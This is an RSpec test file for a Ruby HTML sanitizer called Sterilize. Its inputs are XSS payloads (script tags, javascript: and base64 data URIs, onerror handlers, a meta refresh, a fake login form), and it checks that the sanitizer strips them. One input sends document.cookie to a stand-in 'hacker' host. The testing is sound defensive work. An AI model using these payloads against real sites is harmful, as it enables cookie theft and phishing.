require 'sterilize'

RSpec.describe "Cleaning text" do
  it "tidies messy a tag" do
    input = '<a onclick="function() { alert("hello")">hijack</a>'
    expect(Sterilize.perform(input)).to eq('<a rel="noopener noreferrer">hijack</a>')
  end

  it "removes script tags" do
    input = 'this is some text with a <script>alert("leet");</script>'
    expect(Sterilize.perform(input)).to eq('this is some text with a ')
  end

  it "removes attribues" do
    input = "an <a href=\"javascript:evil()\">evil</a> example"
    expect(Sterilize.perform(input)).to eq('an <a rel="noopener noreferrer">evil</a> example')
  end

  it "disallows iframes" do
    input = '<iframe source="http://localhost:5000/hacking"></iframe>'
    expect(Sterilize.perform(input)).to eq('')
  end

  it "disallows styles" do
    input = '<style type="text/css">@font-face {}</style>'
    expect(Sterilize.perform(input)).to eq('')
  end

  it "cleans a tags" do
    input = '<a href="http://localhost:5000/hacking"></a>'
    expect(Sterilize.perform(input)).to eq('<a href="http://localhost:5000/hacking" rel="noopener noreferrer"></a>')
  end

  it "cleans base64" do
    input = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgna25pZ2h0c3RpY2sgd2FzIGhlcmUnKTwvc2NyaXB0Pg==">HACK HACK HACK</a>'
    expect(Sterilize.perform(input)).to eq('<a rel="noopener noreferrer">HACK HACK HACK</a>')
  end

  it "cleans cookie theft" do
    input = '<SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>'

    expect(Sterilize.perform(input)).to eq('')
  end

  it "cleans onerror" do
    input = '<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>'
    expect(Sterilize.perform(input)).to eq('<img src="http://url.to.file.which/not.exist">')
  end

  it "cleans URI encoded script" do
    input = "<IMG SRC=j&#X41vascript:alert('test2')>"
    expect(Sterilize.perform(input)).to eq('<img>')
  end

  it "removes meta tags" do
    input = '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">'

    expect(Sterilize.perform(input)).to eq('')
  end

  it "deals with forms" do
    input = <<-HTML
    <h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
    HTML

    expect(Sterilize.perform(input)).to eq("    <h3>Please login to proceed</h3> Username:<br><br>Password:<br><br><br><br>\n")
  end

  it "deals with plain strings" do
    input = "Hello, I'm just a string"

    expect(Sterilize.perform(input)).to eq("Hello, I'm just a string")
  end
end